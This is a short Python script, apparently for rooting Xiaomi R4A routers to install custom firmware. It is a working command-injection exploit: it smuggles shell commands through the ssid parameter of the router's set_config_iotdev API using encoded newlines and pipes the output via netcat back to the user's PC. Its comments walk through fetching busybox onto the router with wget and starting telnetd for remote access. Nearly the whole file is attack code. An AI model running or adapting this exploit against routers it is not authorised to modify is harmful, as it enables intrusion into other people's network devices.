import sys
import urllib.parse
import os
import requests

# On computer:
# $ mkdir xiaomir4a
# $ cd xiaomir4a
# $ wget https://github.com/acecilia/OpenWRTInvasion/files/9894805/busybox.zip
# $ unzip busybox.zip busybox
# $ python3 -m http.server 8080 &

# On a new terminal session (place it side by side so you see the result of the commands)
# $ wget https://raw.githubusercontent.com/licryle/Scripts/main/xiaomi_r4a.py
# $ sudo apt install ncat
# $ python3 xiaomi_r4a.py
# (Enter values then type the commands $$ fort shell in shell)
# $$ wget -O /tmp/busybox http://192.168.31.[YOUR IP]:8080/busybox
# $$ ls /tmp/busybox
# $$ chmox +x /tmp/busybox
# $$ /tmp/busybox telnetd

stok = input('What\'s the stok:\n')
pc_ip = '192.168.' + input('What\'s your PC IP:\n192.168.')
pc_port = input('NC port:\n')
pc_router = '192.168.' + input('What\'s your mi router IP:\n192.168.')
template = 'http://{0}/cgi-bin/luci/;stok={1}/api/misystem/set_config_iotdev?bssid=XXXXXX&user_id=XXXXXX&ssid=-h%0A{2}%0A'

command = input('Welcome - enter "exit" to exit or a command:\n$ ')

os.system('nc -lk ' + pc_port + '&')

while command !=  'exit':
    encoded_up = urllib.parse.quote('{0} 2>&1 | nc {1} {2}'.format(command, pc_ip, pc_port))
    
    url = template.format(pc_router,stok,encoded_up)
    # print('GET ' + url)
    print(requests.get(url, headers={'User-Agent': 'Mozilla/5.0'}))

    command = input('\n$ ')

os.system('killall nc')
